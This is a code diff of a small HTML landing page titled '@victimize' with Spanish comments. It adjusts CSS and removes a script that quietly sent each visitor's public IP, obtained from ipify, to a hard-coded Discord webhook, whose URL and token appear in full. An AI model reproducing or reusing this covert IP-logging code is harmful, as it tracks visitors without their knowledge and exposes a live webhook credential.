@@ -7,7 +7,7 @@
     <title>@victimize</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Satoshi:wght@400;700&display=swap');
-        
+
         body, html {
             margin: 0;
             padding: 0;
@@ -16,9 +16,10 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: 'Satoshi';
+            font-family: 'Satoshi', sans-serif;
             overflow: hidden;
             color: white;
+            background-color: black; /* Fondo negro */
         }
 
         .entrance-screen, .main-content {
@@ -32,9 +33,6 @@
             align-items: center;
             flex-direction: column;
             transition: opacity 1s;
-        }
-
-        .entrance-screen {
             background-image: url("lol.png");
             background-size: cover;
             background-position: center;
@@ -42,9 +40,6 @@
 
         .main-content {
             display: none;
-            background-image: url("lol.png");
-            background-size: cover;
-            background-position: center;
         }
 
         .entrance-screen.fade-out {
@@ -52,15 +47,11 @@
         }
 
         img {
-            max-width: 80%;
+            max-width: 90%;
+            max-height: 90%;
             height: auto;
+            object-fit: contain; /* Mantener la calidad y relación de aspecto */
             margin-bottom: 20px;
-        }
-
-        .ip-info {
-            font-size: 16px;
-            margin-top: 20px;
-            margin-left: 10px; /* Ajuste a la derecha */
         }
 
         .click-text {
@@ -91,43 +82,8 @@
                     console.log("Autoplay failed:", error);
                     setTimeout(() => audio.play(), 1000);  // Try again after 1 second
                 });
-                fetchIPInfo();
             }, 1000);  // Duration of the fade-out transition
         });
-
-        function fetchIPInfo() {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    sendWebhook(ip);
-                })
-                .catch(error => {
-                    document.getElementById('ip-info').innerText = 'Failed to load IP information.';
-                    console.error('Error fetching IP info:', error);
-                });
-        }
-
-        function sendWebhook(ip) {
-            const webhookURL = 'https://discord.com/api/webhooks/1246867810412658688/KXVM8CNc3-WLKcUgbpNP-pBFmLT9ll_LKM5cWuI1ss-Vsoi1QrSuvAPydZ1bPx5a_tiq';
-            const content = `New visitor IP: ${ip}`;
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    console.error('Failed to send webhook:', response.status, response.statusText);
-                }
-            })
-            .catch(error => {
-                console.error('Error sending webhook:', error);
-            });
-        }
     </script>
 </body>
 
